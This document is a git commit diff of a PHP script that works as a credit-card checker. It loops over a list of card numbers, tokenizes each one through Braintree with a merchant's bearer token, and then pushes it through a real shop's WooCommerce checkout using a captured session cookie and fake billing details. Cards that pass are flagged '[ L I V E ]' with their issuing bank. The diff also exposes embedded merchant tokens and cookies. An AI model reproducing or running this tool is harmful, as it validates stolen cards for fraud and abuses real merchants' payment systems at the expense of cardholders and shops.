9ce809aebb5f3864258cd64acfa02a4c823a31ad
Hotshot <pubgkittu@gmail.com>
2020-05-29 06:47:43 -0700

    Update api.php

--- api.php
+++ api.php
@@ -151,7 +151,7 @@ $dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/2xhr5rv77mpmcqvn/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=&authorizationFingerprint=eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA3Njk5NjUsImp0aSI6IjZjZjY4ZjE0LTEyZDctNDYyYy04NTM1LWRhZTk4MjBjNzY1MCIsInN1YiI6IjJ4aHI1cnY3N21wbWNxdm4iLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ4aHI1cnY3N21wbWNxdm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6e319.5TZmFytOQBvd1ANQ1OqDdsNsplB_F8RD07sA7oe20FFCU--WbnVLXEc01XjM2Oe19YRWO4TcgQQAwD_QFlcqHw&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_meta%5BsessionId%5D=92b7f136-b1c7-44a2-95c0-03db843f6987&share=undefined&&creditCard%5Bnumber%5D='.$cc.'&creditCard%5BexpirationDate%5D='.$mes1.'%2F'.$ano.'&creditCard%5BcardholderName%5D=VIncent%20Warner&creditCard%5Bcvv%5D='.$cvv.'&creditCard%5Boptions%5D%5Bvalidate%5D=false&_method=POST&callback=callback_jsond575dbb040464f2bb369400a2638fafe');
+curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -165,21 +165,24 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
 # Uncomment the upper two lines if you have filled the upper login details
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: */*',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
-'Host: api.braintreegateway.com',
-'Referer: https://api.braintreegateway.com/',
+'accept: */*',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA4NDU4NjYsImp0aSI6ImU3NWFkM2QwLTRkMDMtNDgwYi1iYjIzLTA5MTg5YWYwOGQ5OSIsInN1YiI6ImNkcHN5Mzk3c3Q1bnI0bjYiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNkcHN5Mzk3c3Q1bnI0bjYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJNVk1BR19pbnN0YW50In19.UclQd2_LXU31GE-Kk9vw3woFH2z3HzRkM2K34RWBAplVZIieH-pvKTRuROtgmzoUIgByiop4kb0t8kST5yxjKg',
+'braintree-version: 2018-05-10',
+'content-type: application/json',
+'origin: https://assets.braintreegateway.com',
+'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
-// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3fd73831-cbf0-4980-9711-99d59e97a4ba"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"13901","streetAddress":"661 STATE ST"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e4349c6b-bcab-4bdd-ae87-7871feec08c7"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"13901","streetAddress":"661 STATE ST"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 $b_pago = curl_exec($ch);
 
 curl_close($ch);
 
    // echo $b_pago;
-$token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
+$token = trim(strip_tags(getstr($b_pago,'"token":"','"')));
 // $token2 = trim(strip_tags(getstr($b_pago,'"client_secret": "','"')));
 $issuebank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
 $issuecountry = trim(strip_tags(getstr($b_pago,'"countryOfIssuance":"','"')));
@@ -190,7 +193,7 @@ $category = trim(strip_tags(getstr($b_pago,'"commercial":"','"')));
 
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://backend.theartofpingpong.co.uk/api/me/payment_methods/');
+curl_setopt($ch, CURLOPT_URL, 'https://shop.muvmag.com/?wc-ajax=checkout');
 
 //////////////////////// PROXY CALLS ////////////////////////////
 //               REMOVE '//' FOR PROXIES TO WORK BELOW
@@ -219,20 +222,19 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Accept: application/json',
-'Accept-Encoding: gzip, deflate, br',
-'Accept-Language: en-US,en;q=0.9',
-'Authorization: Token 584a6ee97390f0b97ec80ffcef4abeec164fc6d7',
-'Content-Type: application/json',
-'Host: backend.theartofpingpong.co.uk',
-'Origin: http://www.theartofpingpong.co.uk',
-'Referer: http://www.theartofpingpong.co.uk/complete-profile',
+'accept: application/json, text/javascript, */*; q=0.01',
+'accept-encoding: gzip, deflate, br',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'cookie: __stripe_mid=41d3d62b-d0eb-4cd3-ae9b-bffd31353c62; PHPSESSID=28m1ib97ot4p99tn04g7eg6rgm; woocommerce_items_in_cart=1; wp_woocommerce_session_0c8a786e3d03df0ee900ac1410177dfc=5f8173064cf81c3c273282bf0828f902%7C%7C1590854972%7C%7C1590851372%7C%7Ce29365f048db36845c5b59376d964381; woocommerce_cart_hash=3927fd1924881f1cce666376a6dcd406; __stripe_sid=dca43965-9201-4eee-81a3-02b2d4b32c76',
+'origin: https://shop.muvmag.com',
+'referer: https://shop.muvmag.com/checkout/',
 'user-agent: '.$browser.''
 ));
 
 //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"payment_method_nonce":"'.$token.'"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=US&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=Binghamton&billing_state=NY&billing_postcode=13901&billing_phone=5182641744&billing_email=pubgkittu%40gmail.com&shipping_first_name=Megha&shipping_last_name=Shyam&shipping_company=&shipping_country=US&shipping_address_1=661+STATE+ST&shipping_address_2=&shipping_city=Binghamton&shipping_state=NY&shipping_postcode=13901&shipping_phone=&order_comments=&woocommerce_affiliate=&shipping_method%5B0%5D=table_rate%3A1&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22aaa1303de72f8f38bca75e6e50cf8c31%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%223928ee7ddb46d62bb3e1beeaf757a1ca%22%7D&wc_braintree_3ds_enabled=&wc_braintree_3ds_active=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fcdpsy397st5nr4n6%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fcdpsy397st5nr4n6%22%7D%2C%22merchantId%22%3A%22cdpsy397st5nr4n6%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22cdpsy397st5nr4n6%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22M%C3%9CVMAG%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTA4NDU4ODEsImp0aSI6ImMxNDY5NjA4LTkxOWYtNDFiNS04NjM1LTMyMWU0ZmQ0MjNmZiIsInN1YiI6ImNkcHN5Mzk3c3Q1bnI0bjYiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImNkcHN5Mzk3c3Q1bnI0bjYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.rFnrCUD4zBwflGnXFXFj4_Q4-4V_Y2NQB48wWM_AUOrd7s4AU55sIi9LsWe_twxV_U1vq1EEma9Sw9Mc9sWq7g%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22payWithVenmo%22%3A%7B%22merchantId%22%3A%222978757119467061557%22%2C%22accessToken%22%3A%22access_token%24production%24cdpsy397st5nr4n6%24756ef55db0831d81b4013eb14186796f%22%2C%22environment%22%3A%22production%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22M%C3%9CVMAG%22%2C%22clientId%22%3A%22AQj5lrTPt4L2kQ9QxFD8o3F1qBM5yadPMMWdnv46K1vvCZGZ7yvCViWR9oEeE-Em1kIC-ZVC1kis7wHn%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fshop.muvmag.com%2Fprivacy%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fshop.muvmag.com%2Fterms%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22MVMAG_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_venmo_nonce_key=&braintree_venmo_device_data=&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=&braintree_wechatpay_nonce_key=&braintree_wechatpay_device_data=&braintree_wechatpay_payment_id=&braintree_alipay_nonce_key=&braintree_alipay_device_data=&braintree_alipay_payment_id=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=d6eadf48cd&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 // // // //*****************************************************************************************************************************************************************************************************************************************************************************
 
@@ -243,7 +245,7 @@ if (curl_errno($ch)) {
 }
 curl_close($ch);
 
-$message = trim(strip_tags(getstr($result,'"detail":"','"')));
+$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tThere was an error processing your payment. Reason: ','\t\t<\/li>\n\t<\/ul>\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"')));
 //  // $code = trim(strip_tags(getstr($result,'"status":"','"')));
 //  // $message2 = trim(strip_tags(getstr($result,'"decline_code": "','"')));
 
@@ -251,23 +253,17 @@ $message = trim(strip_tags(getstr($result,'"detail":"','"')));
 // //////////////////////// BIN INFO ////////////////////////////////
 
 // /////////////////// RESULT ////////////////////////////////////
-if(strpos($result,'"payment_method_token"')){
+if(strpos($result,'"result":"success"')){
     echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ L I V E ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
-
-
-   }
-elseif(strpos($result,'Insufficient Funds')){
-  echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
-   }
-else {
-
-       echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
-
-// updatecart();
-}
-
-curl_close($curl);
-ob_flush();
-       // echo $result;
-//echo $browser;
-?>
+  }
+  elseif(strpos($result,'Insufficient Funds')){
+    echo '<tr><td><font size="2"><font color="#FF0000">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ LIVE ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat-'.$category.'</font></b></font></td></tr>';
+  }
+  else {
+    echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$issuecountry.' | '.$issuebank.' | DEBIT- '.$type.' | cat- '.$category.'</font></b></font></td></tr>';
+  }
+  curl_close($curl);
+  ob_flush();
+  // echo $result;
+  //echo $browser;
+  ?>
